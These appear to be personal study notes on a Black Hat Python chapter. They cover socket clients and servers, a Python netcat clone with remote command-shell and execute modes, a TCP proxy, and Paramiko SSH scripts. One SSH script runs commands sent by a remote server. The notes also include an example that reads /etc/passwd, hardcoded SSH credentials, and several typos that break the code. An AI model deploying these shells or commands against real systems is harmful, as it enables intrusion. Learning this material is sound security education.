# Chapter 2: Basic Networking Tools

### [socket documentation](https://docs.python.org/3/library/socket.html)

# TCP Client

## Code

```python
import socket

target_host = "www.google.com"
target_port = 80

#1 Create a socket object
client = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

#2 connect the client
client.connect((target_host,target_port))

#3 send some data
client.send(b"GET / HTTP/1.1\rInHost: google.com\r\n\r\n")

#4 receive some data
response = client.recv(4096)
print(response.decode ())
client.close()
```

## Explanation

We first create a socket object with the `AF_INET` and `SOCK_STREAM` parameters `1`. The `AF_INET` parameter indicates we’ll use a standard IPv4 address or hostname, and `SOCK_STREAM` indicates that this will be a TCP client. We
then connect the client to the server `2` and send it some data as bytes `3`. The last step is to receive some data back and print out the response `4` and then close the socket. This is the simplest form of a TCP client, but it’s the one you’ll write most often.

# UDP Client

## Code

```python
import socket

target host = "127.0.0.1"
target port = 9997

#1 create a socket object
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

#2 send some data
client.sendto(b"AAABBBCCC", (target_host‚target_port))

#3 receive some data
data, addr = client.recvfrom (4096)
print (data.decode())
client.close ()
```

## Explanation

As you can see, we change the socket type to `SOCK_DGRAM` `1` when creating the socket object. The next step is to simply call sendto() `2`, passing in the data and the server you want to send the data to. Because UDP is a connectionless protocol, there is no call to connect() beforehand. The last step is to call recvfrom() `3` to receive UDP data back. You will also notice that it returns both the data and the details of the remote host and port.

# TCP Server

## Code

```python
import socket 
import threading

IP = '127.0.0.1'
PORT = 9998

def main():
	server = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
	server.bind((IP, PORT)) #1 
	server.listen(5) #2
	print (f'[*] Listening on {IP}: {PORT}')
	
	while True:
		client, address = server.accept() #3
		print (f'[*] Accepted connection from {address [ol]}:{address[1]}')
		client_handler = threading.Thread(target=handle_client, args=(client,))
		client_handler.start() #4

def handle_client(client_socket): #5 
	with client_socket as sock:
		request = sock.recv(1024)
		print (f'[*] Received: {request.decode("utf-8")}')
		sock.send(b'ACK')

if __name__ == '__main__':
	main()
```

## Explanation

To start off, we pass in the IP address and port we want the server to listen on `1`. Next, we tell the server to start listening `2`, with a maximum backlog of connections set to 5. We then put the server into its main loop, where it waits for an incoming connection. When a client connects `3`, we receive the client socket in the client variable and the remote connection details in the address variable. We then create a new thread object that points to our `handle_client` function, and we pass it the client socket object as an argument. We then start the thread to handle the client connection `4`, at which point the main server loop is ready to handle another incoming connection. The `handle_client` function `5` performs the `recv()` and then sends a simple message back to the client. 

# Replacing Netcat

## Code

### `netcat.py`

```python
# Copyright (C) 2023 Saman Pordanesh
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files...

import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

class NetCat:
    def __init__(self, args, buffer=None): # initialize the NetCat object with the arguments from the commandline and the buffer
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create the socket object
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self): # run the command line
        #If we’re setting up a listener, we call the listen method. Otherwise, we call the send method
        if self.args.listen:
            self.listen()
        else:
            self.send()

    # program run as a sender   
    def send(self): 
        self.socket.connect((self.args.target, self.args.port)) # connect to the target and port
        if self.buffer: #if we have a buffer, we send that to the target first
            self.socket.send(self.buffer)
        try: # try/catch -> CTRL-C manual closing 
            while True: # loop to receive data from the target.
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096: # if no more data, we break out of the loop
                        break 
                if response: # print the response data
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode()) # get interactive input, send that input
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()

    # program run as a listener
    def listen(self):
        self.socket.bind((self.args.target, self.args.port)) # listen method binds to the target and port
        self.socket.listen(5)
        while True: # starts listening in a loop
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread( # passing the connected socket to the handle method
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()

    # logic to perform file uploads, execute commands, and create an interactive shell.        
    def handle(self, client_socket):
        if self.args.execute: # If a command should be executed
            output = execute(self.args.execute) # passes that Basic Networking Tools command to the execute function
            client_socket.send(output.encode()) # sends the output back on the socket

        elif self.args.upload: # If a file should be uploaded
            file_buffer = b''
            while True: # set up a loop to listen for content on the listening socket
                # receive data until there’s no more data
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            # write that accumulated content to the specified file.
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())

        elif self.args.command: # if the shell is to be created
            cmd_buffer = b''
            while True: # loop, send a prompt to the sender, and wait for a command string to come back
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode()) # execute the command by using the execute function
                    if response:
                        client_socket.send(response.encode()) # return the output of the command to the sender
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return 
    output = subprocess.check_output(shlex.split(cmd),stderr=subprocess.STDOUT) #1
    return output.decode()

if __name__ == '__main__':
        
    parser = argparse.ArgumentParser( #create a commandline interface from 'argparse' module
    description='BHP Net Tool',
    formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog=textwrap.dedent('''Example:  
        netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell 
        netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
        netcat.py -t 192.168.1.108 -p 5555 -l -e="cat /etc/passwd" # execute command
        echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
        netcat.py -t 192.168.1.108 -p 5555 # connect to server
    ''')) #provide example usage when --help
        
    # six arguments for indicating how the program to behave
    parser.add_argument('-c', '--command', action='store_true', help='command shell') # sets up an interactive shell
    parser.add_argument('-e', '--execute', help='execute specified command') # executes one specific command
    parser.add_argument('-l', '--listen', action='store_true', help='listen') # indicates that a listener should be set up,
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port') # specifies the port on which to communicate
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP') # specifies the target IP
    parser.add_argument('-u', '--upload', help='upload file') # specifies the name of a file to upload.
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()
        
    nc = NetCat(args, buffer.encode()) # initialize the NetCat
    nc.run(
```

## Explanation

The provided code is an implementation of a simple NetCat tool using Python. NetCat is a versatile networking tool that allows you to read from and write to network connections. It can be used for various purposes such as debugging, port scanning, transferring files, and creating reverse shells.

Here's an explanation of the code:

1. The code begins by importing the required modules (**`argparse`**, **`socket`**, **`shlex`**, **`subprocess`**, **`sys`**, **`textwrap`**, and **`threading`**).
2. The **`NetCat`** class is defined, which serves as the main component of the NetCat tool. It has methods for sending and receiving data over a network connection.
3. The **`__init__`** method initializes the **`NetCat`** object. It takes **`args`** (parsed command-line arguments) and **`buffer`** (input data) as parameters. It sets up a socket object, configures it, and stores the arguments and buffer.
4. The **`run`** method is responsible for determining whether to listen or send data based on the command-line arguments. If the **`listen`** flag is provided, it calls the **`listen`** method; otherwise, it calls the **`send`** method.
5. The **`send`** method establishes a connection with the target specified in the command-line arguments. It sends the buffer (if provided) and enters a loop to receive data from the target. It prints the received data and prompts for user input to send back to the target.
6. The **`listen`** method binds the socket to the specified IP address and port, starts listening for incoming connections, and spawns a new thread for each client connection. The **`handle`** method is called in each new thread to handle the client connection.
7. The **`handle`** method receives a client socket and checks the command-line arguments to determine the action to perform. If the **`execute`** flag is provided, it executes the specified command and sends the output back to the client. If the **`upload`** flag is provided, it receives the file data from the client and saves it locally. If the **`command`** flag is provided, it sets up an interactive shell by continuously receiving commands from the client, executing them, and sending back the output.
8. The **`execute`** function is a helper function used to execute shell commands. It takes a command as input, strips any leading/trailing whitespace, and executes the command using the **`subprocess.check_output`** function. The output is returned as a string.
9. The **`if __name__ == '__main__':`** block is the entry point of the script. It sets up the command-line argument parser (**`argparse.ArgumentParser`**) and defines the available arguments (**`c`**, **`e`**, **`l`**, **`p`**, **`t`**, **`u`**). It also parses the provided arguments and determines whether to read from standard input or use a provided buffer based on the **`listen`** flag. Finally, it creates an instance of the **`NetCat`** class (**`nc`**) and calls its **`run`** method to start the NetCat tool.

Overall, this code allows you to use the NetCat tool to listen for incoming connections, send data to a specified target, execute commands, upload files, and interact with a command shell.

# Building a TCP Proxy

We need to display the communication between the
local and remote machines to the console (`hexdump`). We need to receive data from an incoming socket from either the local or remote machine (`receive_from`). We need to manage the traffic direction between remote and local
machines (`proxy_handler`). Finally, we need to set up a listening socket and pass it to our `proxy_handler` (`server_loop`).

## Code

### `proxy.py`

```python
# Copyright (C) 2023 BLACK HAT PYTHON, Modified By Saman Pordanesh

import sys
import socket
import threading

# contains ASCII printable characters, if one exists, or a dot (.) if such a representation doesn’t exist.
HEX_FILTER = ''.join(
    [(len(repr(chr(i))) == 3) and chr(i) or '.' for i in range(256)])

"""
    hexdump() -> takes some input as bytes or a string and prints a hexdump to the console.
    output the packet details with both their hexadecimal values and ASCII-printable characters
"""
def hexdump(src, length=16, show=True): 
    # to make sure we have a string, decoding the bytes -> if byte string was passed in
    if isinstance(src, bytes): 
        src = src.decode()

    results = list()
    for i in range(0, len(src), length):
        word = str(src[i:i+length]) # grab a piece of the string to dump & put it into the word
        
        # substitute-> string representation of each character-> corresponding character in the raw string (printable)
        printable = word.translate(HEX_FILTER)
        # substitute the hex representation of the integer value of every character in the raw string (hexa)
        hexa = ' '.join([f'{ord(c):02X}' for c in word])
        hexwidth = length*3
        # array -> contains: {hex value of the index of the first byte in the word} {hex value of the word} {its printable representation}
        results.append(f'{i:04x} {hexa:<{hexwidth}} {printable}')
    
    if show:
        for line in results:
            print(line)
    else:
        return results

"""
    function that the two ends of the proxy will use to receive data
    arg: 'connection' -> socket object -> for receiving both local and remote data
 """
def receive_from(connection):

    # empty byte string -> buffer -> accumulate responses from the socket
    buffer = b"" 
    # connect timeout -> can be changed by case   
    connection.settimeout(5)    

    try:   
        # loop: read response data into the buffer 
        while True:     
            data = connection.recv(4096)
            if not data:
                break
            buffer += data
    except Exception as e:
        pass
    # return the buffer byte string -> could be either the local or remote machine.
    return buffer   

"""
    modify the response/request packets before the proxy sends them
"""
def request_handler(buffer):
    # perform packet modifications
    return buffer
def response_handler(buffer):
    # perform packet modifications
    return buffer

""""
    This function contains the bulk of the logic for our proxy
"""
def proxy_handler(client_socket, remote_host, remote_port, receive_first):
    remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # we connect to the remote host
    remote_socket.connect((remote_host, remote_port)) 

    # make sure we don’t need to first initiate a connection to the remote side and request data before going into the main loop
    if receive_first:
        remote_buffer = receive_from(remote_socket)
        hexdump(remote_buffer)
    
    # hand the output to the response_handler function
    remote_buffer = response_handler(remote_buffer)
    if len(remote_buffer):
        print("[<==] Sending %d bytes to localhost." % len(remote_buffer))
        # send the received buffer to the local client
        client_socket.send(remote_buffer)

    """"
        loop to continually read from the local client, process the data, send it to
        the remote client, read from the remote client, process the data, and send it
        to the local client until we no longer detect any data.
    """
    while True:
        local_buffer = receive_from(client_socket)
        if len(local_buffer):
            line = "[==>]Received %d bytes from localhost." % len(local_buffer)
            print(line)
            hexdump(local_buffer)
            local_buffer = request_handler(local_buffer)
            remote_socket.send(local_buffer)
            print("[==>] Sent to remote.")

        remote_buffer = receive_from(remote_socket)
        if len(remote_buffer):
            print("[<==] Received %d bytes from remote." % len(remote_buffer))
            hexdump(remote_buffer)
            remote_buffer = response_handler(remote_buffer)
            client_socket.send(remote_buffer)
            print("[<==] Sent to localhost.")

        # no data to send -> cloce local/remote sockets -> break the loop
        if not len(local_buffer) or not len(remote_buffer): 
            client_socket.close()
            remote_socket.close()
            print("[*] No more data. Closing connections.")
            break

""""
    server_loop function to set up and manage the connection.
"""
def server_loop(local_host, local_port,
    remote_host, remote_port, receive_first):

    # create a socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

    try:
        # bind the socket to the localhost and listening
        server.bind((local_host, local_port))
    except Exception as e:
        print('problem on bind: %r' % e)

        print("[!!] Failed to listen on %s:%d" % (local_host, local_port))
        print("[!!] Check for other listening sockets or correct permissions.")
        sys.exit(0)

    print("[*] Listening on %s:%d" % (local_host, local_port))
    server.listen(5)
    while True: 
        client_socket, addr = server.accept()
        # print out the local connection information
        line = "> Received incoming connection from %s:%d" % (addr[0], addr[1])
        print(line)
        # start a thread to talk to the remote host -> does all of the sending and receiving of juicy bits to either side of the data stream.
        proxy_thread = threading.Thread(
            target=proxy_handler,
            args=(client_socket, remote_host,
            remote_port, receive_first))
        proxy_thread.start()

"""
    In the main function, we take in some command line arguments and then fire up the server loop that listens for connections.    
    We need 5 arguments to pass to the terminal: local_host, local_port, remote_host, remote_port, receive_first
"""
def main():
    if len(sys.argv[1:]) != 5:
        print("Usage: ./proxy.py [localhost] [localport]", end='')
        print("[remotehost] [remoteport] [receive_first]")
        print("Example: ./proxy.py 127.0.0.1 9000 10.12.132.1 9000 True")
        sys.exit(0)
    local_host = sys.argv[1]
    local_port = int(sys.argv[2])
    remote_host = sys.argv[3]
    remote_port = int(sys.argv[4])

    receive_first = sys.argv[5]

    if "True" in receive_first:
        receive_first = True
    else:
        receive_first = False

    server_loop(local_host, local_port,
    remote_host, remote_port, receive_first)

# Start the server
if __name__ == "__main__":
    main()
```

## Explanation

The provided code sets up a TCP proxy server that listens on a local host and port and forwards incoming connections to a remote host and port.

The code includes several functions:

1. **`hexdump(src, length=16, show=True)`**: This function takes some input as bytes or a string and prints a hexdump to the console. It displays both the hexadecimal values and ASCII printable characters of the input data.
2. **`receive_from(connection)`**: This function is used to receive data from a socket connection. It reads the response data into a buffer until there is no more data or an exception occurs.
3. **`request_handler(buffer)`**: This function is called to modify the request packets before the proxy sends them. You can customize this function to implement specific packet modifications.
4. **`response_handler(buffer)`**: This function is called to modify the response packets received from the remote server. Similar to **`request_handler()`**, you can customize this function to implement specific modifications.
5. **`proxy_handler(client_socket, remote_host, remote_port, receive_first)`**: This function handles the proxy logic. It establishes a connection to the remote host, receives data from the client, sends it to the remote host, receives data from the remote host, and sends it back to the client. It also calls the request and response handlers to modify the data if needed.
6. **`server_loop(local_host, local_port, remote_host, remote_port, receive_first)`**: This function sets up and manages the proxy server. It binds the server to the local host and port, listens for incoming connections, and starts a thread to handle each connection using the **`proxy_handler()`** function.
7. **`main()`**: This is the entry point of the script. It parses command line arguments to obtain the local and remote host and port information and then calls the **`server_loop()`** function.

To use this script, you need to provide the following command-line arguments: **`local_host`**, **`local_port`**, **`remote_host`**, **`remote_port`**, and **`receive_first`**. For example:

```
yamlCopy code
./proxy.py 127.0.0.1 9000 10.12.132.1 9000 True
```

This would start the proxy server on **`127.0.0.1:9000`**, forwarding connections to **`10.12.132.1:9000`**, and receiving data from the client first.

Please note that this code may require further modifications and error handling to suit your specific needs and environment.

## Points

- `HEX_FILTER`
    
    ```python
    HEX_FILTER = ''.join(
        [(len(repr(chr(i))) == 3) and chr(i) or '.' for i in range(256)])
    ```
    
    Will result as following
    
    ![Screenshot 2023-06-14 at 10.35.19 AM.png](Chapter%202%20Basic%20Networking%20Tools%20a21c6c3baf92451094439c53b80b5b02/Screenshot_2023-06-14_at_10.35.19_AM.png)
    
- Example of `hexdump()` function result:
    
    ![Screenshot 2023-06-14 at 10.53.42 AM.png](Chapter%202%20Basic%20Networking%20Tools%20a21c6c3baf92451094439c53b80b5b02/Screenshot_2023-06-14_at_10.53.42_AM.png)
    

# SSH with Paramiko

### [`paramiko.org`](http://paramiko.org/)

We need **`pip install paramiko`** first ****

## Code 1

### `ssh_rcmd.py`

```python
import paramiko

"""
    makes a connection to an SSH server and runs a single command.
"""
def ssh_command(ip, port, user, passwd, cmd):
    client = paramiko.SSHClient()
    # set the policyto accept the SSH key for the SSH server we’re connecting to
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    # run the command 3 that we passed in the call to the ssh_command function.
    _, stdout, stderr = client.exec_command(cmd)
    output = stdout.readlines() + stderr.readlines()
    # if the command produced output -> print each line of the output
    if output:
        print('--- Output ---')
        for line in output:
            print(line.strip())

if __name__ == '__main__':
    # use it to get the username/password from the current environment
    import getpass
    # user = getpass.getuser()
    user = input('Username: ')
    password = getpass.getpass()
    ip = input('Enter server IP: ') or '192.168.1.203'
    port = input('Enter port or <CR>: ') or 2222
    cmd = input('Enter command or <CR>: ') or 'id'
    # run and send requestd variables to be executed
    ssh_command(ip, port, user, password, cmd)
```

## Explanation 1

The code you provided establishes an SSH connection to a remote server using the Paramiko library and runs a single command on that server. Here's an explanation of the code:

1. The code imports the **`paramiko`** module, which is a Python implementation of the SSHv2 protocol.
2. The **`ssh_command`** function is defined. It takes five parameters: **`ip`** (IP address of the SSH server), **`port`** (SSH port number), **`user`** (username for authentication), **`passwd`** (password for authentication), and **`cmd`** (command to be executed on the server).
3. Inside the function, a new **`SSHClient`** object is created using **`paramiko.SSHClient()`**. This object represents an SSH client that can make connections to SSH servers.
4. The **`set_missing_host_key_policy`** method is called on the client object to set the policy for automatically accepting the SSH server's host key. This allows the client to connect to servers without prompting the user to confirm the key's authenticity.
5. The **`connect`** method is called on the client object to establish the SSH connection. It takes the IP address (**`ip`**), port number (**`port`**), username (**`user`**), and password (**`passwd`**) as arguments.
6. The **`exec_command`** method is called on the client object to run the specified command (**`cmd`**) on the remote server. It returns three file-like objects: **`stdin`** (not used here), **`stdout`** (output from the command), and **`stderr`** (error output from the command).
7. The output from the command is read line by line using the **`readlines`** method on **`stdout`** and **`stderr`**. The lines are concatenated into a list called **`output`**.
8. If the **`output`** list is not empty (i.e., the command produced some output), the lines are printed one by one.
9. The script checks if it is being executed as the main module (**`if __name__ == '__main__':`**), indicating that the script is run directly rather than being imported as a module.
10. Inside the main block, the script prompts the user for their username, password, server IP address, port, and command. The **`getpass`** module is used to securely obtain the password without displaying it on the screen.
11. The **`ssh_command`** function is called with the provided input values to establish the SSH connection and execute the command on the remote server.

In summary, this code allows you to connect to an SSH server, run a command on that server, and display the command's output. It uses the Paramiko library to handle the SSH connection and execute the command remotely.

## Code 2

### `ssh_rcmd.py`

```python
import paramiko
import shlex
import subprocess

""""
    Pretty much the same as ssh_command function, but with a loop which can take more than one command
"""
def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    # set the policyto accept the SSH key for the SSH server we’re connecting to
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            # take commands from the connection
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                # execute the command
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True) 
                # send any output back to the caller
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

if __name__ == '__main__':
    import getpass
    user = getpass.getuser()
    password = getpass.getpass()
    ip = input('Enter server IP: ')
    port = input('Enter port: ')
    # the first command we send is ClientConnected
    ssh_command(ip, port, user, password, 'ClientConnected')
```

- Pretty much the same as `ssh_command` function in `ssh_cmd.py`, but with a loop which can take more than one command.

## Code 3

### `ssh_server.py`

```python
# Copyright (C) 2023 BLACK HAT PYTHON, Modified By Saman Pordanesh

""""
    creates an SSH server for our SSH client (where we’ll run commands) to connect to.
"""

import os
import paramiko
import socket
import sys
import threading

CWD = os.path.dirname(os.path.realpath(__file__))
# using the SSH key included in the Paramiko demo files
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))

# SSH-inize
class Server (paramiko.ServerInterface):
    def _init_(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if (username == 'sina') and (password == '12345'): # hard coded username and password. This can be changed.
            return paramiko.AUTH_SUCCESSFUL
        

if __name__ == '__main__':
    server = '127.0.0.1'    # you can modify this
    ssh_port = 2222         # you can modify this
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # start a socket listener
        sock.bind((server, ssh_port))
        sock.listen(100)
        print('[+] Listening for connection ...')
        client, addr = sock.accept()
    except Exception as e:
        print('[-] Listen failed: ' + str(e))
        sys.exit(1)
    else:
        print('[+] Got a connection!', client, addr)

    # configure the authentication methods
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(HOSTKEY)
    server = Server()
    bhSession.start_server(server=server)

    chan = bhSession.accept(20)
    if chan is None:
        print('*** No channel.')
        sys.exit(1)

    print('[+] Authenticated!')
    print(chan.recv(1024))
    chan.send('Welcome to bh_ssh')
    try:
        while True:
            command= input("Enter command: ")
            if command != 'exit':
                chan.send(command)
                r = chan.recv(8192)
                print(r.decode())
            else:
                chan.send('exit')
                print('exiting')
                bhSession.close()
                break
    except KeyboardInterrupt:
        bhSession.close()
```

## Explanation 3

The code provided sets up an SSH server that allows an SSH client to connect and run commands remotely. Let's break down the code:

1. The code begins with some import statements to import the necessary modules, including **`os`**, **`paramiko`**, **`socket`**, and **`sys`**.
2. The variable **`CWD`** is assigned the current working directory of the script.
3. The **`HOSTKEY`** variable is set to the RSA key file (**`test_rsa.key`**) located in the same directory as the script.
4. The code defines a class called **`Server`** that extends **`paramiko.ServerInterface`**. This class implements methods to handle channel requests and password authentication. In this case, it allows only a "session" channel request and checks for a specific hardcoded username and password (**`sina`** and **`12345`**) for authentication.
5. Inside the **`__main__`** block, the server IP address (**`127.0.0.1`**) and SSH port (**`2222`**) are assigned to the variables **`server`** and **`ssh_port`**, respectively.
6. A socket is created, bound to the server IP address and SSH port, and set to listen for incoming connections.
7. If a connection is accepted, the code proceeds to configure the authentication methods by creating a **`paramiko.Transport`** object called **`bhSession`** and adding the server key (**`HOSTKEY`**) to it.
8. An instance of the **`Server`** class is created and passed as an argument to **`bhSession.start_server()`** to start the SSH server.
9. The code then accepts a channel (**`chan`**) from the SSH session within a certain timeout period.
10. If the channel is successfully accepted, the code prints an "Authenticated!" message and proceeds to handle user input and command execution.
11. Inside a loop, the user is prompted to enter a command. If the command is not "exit," it is sent through the channel to the SSH client. The response from the client is received and printed.
12. If the user enters "exit," the command is sent, and the loop is terminated, closing the SSH session.
13. An exception handler is in place to catch a keyboard interruption (**`KeyboardInterrupt`**) and gracefully close the SSH session.

Overall, this code sets up a basic SSH server that listens for connections, authenticates clients based on a hardcoded username and password, and allows the execution of commands on the remote client.

# **SSH Tunneling**

SSH tunneling, or port forwarding, allows you to securely connect two computers by **forwarding traffic** from a local port on one computer to a remote port on another computer through an encrypted SSH tunnel. This can be done locally, remotely, or dynamically. Once set up, you can access the remote service as if it were running on your local computer, providing a secure way to access remote services and protect sensitive data.

![Screenshot 2023-06-14 at 2.41.45 PM.png](Chapter%202%20Basic%20Networking%20Tools%20a21c6c3baf92451094439c53b80b5b02/Screenshot_2023-06-14_at_2.41.45_PM.png)

- The Paramiko demo files include a file called `rforward.py` that does exactly this.

[rforward.py](Chapter%202%20Basic%20Networking%20Tools%20a21c6c3baf92451094439c53b80b5b02/rforward.py)